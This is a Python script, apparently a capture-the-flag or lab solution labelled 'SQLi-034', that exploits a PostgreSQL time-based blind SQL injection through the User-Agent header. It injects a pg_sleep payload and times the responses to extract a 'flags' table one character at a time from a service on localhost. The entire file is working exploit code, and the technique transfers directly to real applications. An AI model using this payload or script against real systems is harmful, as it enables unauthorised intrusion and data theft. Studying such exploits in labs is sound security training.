#!/usr/bin/env python3
"""SQLi-034: PostgreSQL User-Agent Time-based Exploit"""
import requests, time, string

def check(cond):
    start = time.time()
    ua = f"Mozilla'); SELECT CASE WHEN ({cond}) THEN pg_sleep(2) END--"
    requests.get("http://localhost:5034/", headers={"User-Agent": ua}, timeout=30)
    return time.time() - start > 1.5

def extract(table, column):
    result = ""
    for pos in range(1, 50):
        for c in string.ascii_letters + string.digits + "_{}":
            if check(f"(SELECT SUBSTRING({column},{pos},1) FROM {table})='{c}'"):
                result += c
                print(f"[+] {column}: {result}")
                break
        else:
            break
    return result

if __name__ == "__main__":
    print("SQLi-034: PostgreSQL User-Agent Time-based Exploit")
    flag = extract("flags", "value")
    print(f"[+] FLAG: {flag}")
